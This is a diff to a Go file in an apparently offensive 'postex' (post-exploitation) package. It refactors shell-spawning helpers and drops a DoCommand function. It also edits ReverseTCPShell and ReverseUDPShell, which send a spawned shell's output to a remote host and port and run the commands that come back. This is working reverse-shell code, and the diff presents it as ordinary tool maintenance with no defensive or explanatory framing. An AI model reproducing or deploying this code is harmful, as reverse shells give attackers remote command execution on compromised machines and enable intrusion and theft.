@@ -4,8 +4,6 @@ package postex
 import "fmt"
 import "os"
 import "strings"
-import "bytes"
-import "time"
 import "net"
 import "strconv"
 
@@ -26,13 +24,12 @@ func LocalShell(filepath string) {
 	}
 	session.launch()
 	defer session.stop()
-	ch := make(chan string, 0)
 	//output goroutine
-	go func(session *shell, ch chan string) {
+	go func(session *shell) {
 		for {
-			ch <- session.recv()
+			fmt.Printf(session.recv())
 		}
-	}(session,ch)
+	}(session)
 	//input loop
 	running := true
 	for running == true {
@@ -44,63 +41,7 @@ func LocalShell(filepath string) {
 		}
 		//now send the command
 		session.send(string(msg) + "\n")
-		//collect output
-		timeout := 0
-		for timeout < 100 {
-			select {
-				case x := <-ch:
-					fmt.Printf(x)
-				default:
-					time.Sleep(10 * time.Millisecond)
-					timeout += 10
-			}
-		}
 	}
-}
-
-/* 
-* DoCommand(filepath string, commands ...string) string
-* Builds on the functionality in LocalShell() to execute a series of commands.
-* Returns output as a single string.
-*/
-
-
-func DoCommand(filepath string, commands ...string) string {
-	//spawn the shell
-	var session *shell
-	var err error
-	session,err = spawnShell(filepath)
-	if err != nil {
-		fmt.Println("Error initialising.")
-		fmt.Println(string(err.Error()))
-		return ""
-	}
-	session.launch()
-	defer session.stop()
-	ch := make(chan string, 0)
-	//output goroutine
-	go func(session *shell, ch chan string) {
-		for {
-			ch <- session.recv()
-		}
-	}(session,ch)
-	output := bytes.Buffer{}
-	//input handling
-	for _,command := range commands {
-		session.send(command + "\n")
-		timeout := 0
-		for timeout < 100 {
-			select {
-				case x := <-ch:
-					fmt.Println(x)
-					output.WriteString(x)
-				default:
-					time.Sleep(10 * time.Millisecond)
-					timeout += 10
-			}
-		}
-	}
-	return output.String()
 }
 
 /*
@@ -134,13 +75,12 @@ func ReverseTCPShell(filepath string, host string, port int) {
 	}
 	session.launch()
 	defer session.stop()
-	ch := make(chan string, 0)
 	//output goroutine
-	go func(session *shell, ch chan string) {
+	go func(session *shell) {
 		for {
 			target_conn.Write([]byte(session.recv()))
 		}
-	}(session,ch)
+	}(session)
 	//input loop
 	running := true
 	for running == true {
@@ -151,7 +91,8 @@ func ReverseTCPShell(filepath string, host string, port int) {
 			running = false
 		}
 		//now send the command
-		session.send(string(msg) + "\n")
+		string_msg := strings.TrimRight(string(msg), "\r\n")
+		session.send(string_msg + "\r\n")
 	}
 }
 
@@ -187,13 +128,12 @@ func ReverseUDPShell(filepath string, host string, port int) {
 	}
 	session.launch()
 	defer session.stop()
-	ch := make(chan string, 0)
 	//output goroutine
-	go func(session *shell, ch chan string) {
+	go func(session *shell) {
 		for {
 			target_conn.Write([]byte(session.recv()))
 		}
-	}(session,ch)
+	}(session)
 	//input loop
 	running := true
 	for running == true {
@@ -204,7 +144,8 @@ func ReverseUDPShell(filepath string, host string, port int) {
 			running = false
 		}
 		//now send the command
-		session.send(string(msg) + "\n")
+		string_msg := strings.TrimRight(string(msg), "\r\n")
+		session.send(string_msg + "\r\n")
 	}
 }
 
